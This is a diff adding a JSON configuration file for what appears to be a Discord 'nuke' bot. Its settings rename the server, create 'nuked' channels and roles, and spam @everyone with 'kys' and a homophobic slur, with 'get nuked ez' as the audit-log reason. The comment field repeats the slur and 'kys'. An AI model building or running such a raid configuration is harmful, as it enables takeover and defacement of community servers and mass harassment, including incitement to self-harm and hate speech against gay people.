@@ -1,0 +1,11 @@
+{ 
+    "comment" : "lol cread winning, kys gay fag",
+    "token" : "bot token",
+    "command-id" : "user id of person who can use commands",
+    "prefix" : "-",
+    "change-name" : "Cread",
+    "channel-names" : "nuked-ez,nuked-lol",
+    "role-names" : "lol,ez",
+    "spam-messages" : "kys - @everyone,@everyone wyd fag",
+    "audit-log-reasons" : "get nuked ez,nuked"
+}
